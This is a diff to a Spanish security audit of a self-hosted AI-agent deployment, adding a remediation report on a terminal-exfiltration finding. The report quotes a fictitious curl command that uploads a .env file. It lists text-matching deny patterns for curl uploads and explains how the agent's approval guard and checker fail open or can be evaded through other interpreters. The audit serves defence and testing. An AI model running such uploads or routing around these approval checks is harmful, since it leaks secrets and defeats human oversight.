@@ -117,6 +117,38 @@ La arquitectura es deliberadamente de baja exposición: gateway local, Telegram 
 - **Verificación posterior:** repetir exactamente las tres simulaciones y exigir `deny` o aprobación explícita contextual; ejecutar además casos positivos inocuos.
 - **¿Bloquea Empleo Ops?:** Sí. Un CV o historial profesional amplía el valor de los datos exfiltrables.
 
+#### Fase A de corrección — resultado `PARTIAL` (2026-08-11)
+
+La Fase A utilizó exclusivamente fixtures ficticios y temporales. Endurece los dos scripts versionados y prepara una mitigación textual para una familia de comandos, pero **no cierra F-01**: continúa abierta la ejecución genérica por terminal y no se aplicó ningún cambio al runtime.
+
+**Descubrimiento del control real:**
+
+- La release estable de referencia es `v2026.8.3` (`0.20.0`). El checkout instalado también declara `0.20.0`, contiene esa release como ancestro y está 615 commits por delante; por tanto, no se clasifica simplemente como desactualizado. `hermes approvals test` no existe en el tag estable y sí en el snapshot instalado.
+- `hermes approvals test` clasifica el **texto normalizado del comando** mediante hardlines, `approvals.deny`, modo, allowlist y patrones peligrosos. No abre archivos, no resuelve rutas o enlaces simbólicos, no determina destinos ni simula efectos, y no invoca Tirith. `no guard matched` significa sólo que ninguno de esos clasificadores textuales coincidió.
+- `approvals.deny` vive en `config.yaml`, acepta patrones glob sobre el comando completo y se evalúa antes del modo permisivo. Es configurable sin modificar core, pero no constituye un control semántico o un sandbox.
+- En ejecución interactiva, Tirith y los patrones internos pueden elevar un comando a aprobación; una advertencia o bloqueo de Tirith no equivale necesariamente a una denegación incondicional. Con `tirith_fail_open: true`, indisponibilidad, timeout o error permiten continuar; además, el circuito abierto observado devuelve `allow` incluso al probar la clase con fail-closed.
+- Tirith `0.3.1` clasificó como `allow`, sin hallazgos, el comando ficticio `curl --data-binary @.../.env ...`. Una regla candidata aislada en `tests/fixtures/f01-approvals-deny.yaml` sí deniega las formas directas `--data-binary @`, `--upload-file` y `-T`, y conserva comandos inocuos, pero sigue siendo una coincidencia textual eludible mediante otros intérpretes o efectos indirectos.
+
+| Amenaza probada | Control versionado o candidato | Resultado de Fase A |
+|---|---|---|
+| Archivo `.env`, clave o imagen enlazada entregados al script Telegram | Tipo real de imagen, archivo regular, ruta no sensible y rechazo de symlinks | `PASS` sintético |
+| Destino Telegram distinto o allowlist ausente | Coincidencia obligatoria y exacta con una única allowlist; transporte inyectado y `--dry-run` | `PASS` sintético; no desplegado |
+| Token, destino o causa sensible en errores | Mensajes genéricos y códigos de salida diferenciados | `PASS` sintético |
+| Exportación externa, absoluta, con `..`, a destino sensible o mediante symlink | Raíz única, resolución canónica, rechazo sensible y de symlinks | `PASS` sintético |
+| Sobrescritura o escritura incompleta | No sobrescribir por defecto, temporal en el mismo directorio y publicación atómica, modo `0600` en Linux | `PASS` sintético |
+| Listado que expone cuerpos o interpreta mal límite cero | Cuerpos excluidos por defecto; `--limit 0` devuelve cero filas | `PASS` sintético |
+| Instrucción de entrada que intenta cambiar la política | Rechazo antes de persistir y sin repetir el cuerpo | `PASS` sintético |
+| `curl` directo con carga de archivo | Patrones candidatos en fixture de `approvals.deny` | `PASS` aislado sólo para las formas cubiertas; no aplicado |
+| Exfiltración genérica por terminal o intérpretes alternativos | No existe control oficial path-aware demostrado en `0.20.0` | **Pendiente; mantiene F-01 abierto** |
+
+**Resultados reproducibles:** la suite ampliada terminó `OK` en Windows con 25 casos; 6 approvals se omiten allí porque el checkout oficial Linux no está disponible y 2 casos de symlink requieren un privilegio que ese Windows no concede. En Linux, con el venv oficial y el checkout instalado, pasaron 19/19 pruebas de scripts y 6/6 de approvals, incluidos symlinks, invocación histórica, `add/show/update-status/export`, interrupción atómica y la ausencia de resolución de efectos en approvals. La CLI oficial aislada produjo tres `user-deny` (código 3) para cargas ficticias y dos `allow` (código 0) para comandos inocuos. El timeout SSH observado antes fue intermitente: una comprobación posterior confirmó TCP/22, handshake, autenticación pública y ejecución de `true`; el alias DNS `hermes` no resuelve por sí mismo, pero `ssh_config` lo traduce a la IP configurada. No se ejecutó `curl`, no hubo tráfico Telegram ni lectura del estado real.
+
+La publicación mediante `os.replace` evita archivos JSONL parcialmente escritos y la interrupción deja intacto el archivo anterior. No hay todavía un bloqueo que serialice el ciclo completo leer-modificar-escribir: dos escritores concurrentes pueden perder la última actualización aunque no corrompan el formato. Esa limitación queda pendiente y no se presenta como resuelta por Fase A.
+
+**Cobertura pendiente:** comandos equivalentes mediante Python u otros binarios, sustituciones y variables de shell, scripts intermediarios, interpretación de efectos por archivo/destino, comportamiento humano ante solicitudes de aprobación y despliegue/verificación en el runtime vivo.
+
+**Aplicación futura con rollback:** (1) registrar versión y hashes y respaldar los dos scripts y la configuración activa sin mostrar secretos; (2) desplegar primero los scripts y repetir pruebas sintéticas y `--dry-run`; (3) tras aprobación específica, añadir una regla candidata cada vez y verificar casos negativos y positivos; (4) evaluar fail-closed y sandbox/aprobación humana obligatoria sin considerar Tirith suficiente por sí solo; (5) ante regresión, restaurar los archivos respaldados, retirar la última regla y repetir la batería. Hasta demostrar un control global, la alternativa mínima es desactivar la ejecución terminal sensible o exigir aprobación humana y aislamiento.
+
 ### F-02 — Captura móvil con deriva funcional
 
 - **Severidad:** Media.
@@ -288,6 +320,7 @@ Fuentes: [Europass sobre adaptar el CV](https://europass.europa.eu/en/create-eur
 - **Rollback:** las pruebas no deben tocar datos reales; eliminar sólo fixtures temporales.
 - **Verificación posterior:** suite local reproducible y prueba de humo remota explícitamente aprobada.
 - **¿Bloquea Empleo Ops?:** Sí para formalizar una skill; no para un experimento manual sin persistencia.
+- **Revisión Fase A:** se añadieron pruebas versionadas para F-01 y los dos scripts; el hallazgo queda parcialmente atendido, no cerrado, hasta extender cobertura y ejecutar integración controlada del runtime.
 
 ### F-14 — Contención de base favorable
 
